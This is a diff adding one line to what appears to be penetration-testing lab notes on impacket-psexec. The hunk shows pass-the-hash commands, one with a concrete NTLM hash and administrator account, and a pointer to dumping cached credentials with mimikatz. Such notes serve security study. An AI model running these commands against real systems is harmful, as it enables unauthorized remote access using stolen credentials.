@@ -2549,6 +2549,8 @@ We can use an existing implementation (https://web.archive.org/web/2022022519004
 impacket-psexec sqlserver:<password>@<IP>
 
 impacket-psexec -hashes <lmhash/MsCachev2>:<NTLM> <user>@10.11.1.122
+
+impacket-psexec 'SVCLIENT73 /administrator'@10.11.1.24 -hashes ':ee0c207898a5bccc01f38115019ca2fb'
 ```
 `MsCachev2` can be obtained by executing `lsadump::cache` in `mimikatz`.
 
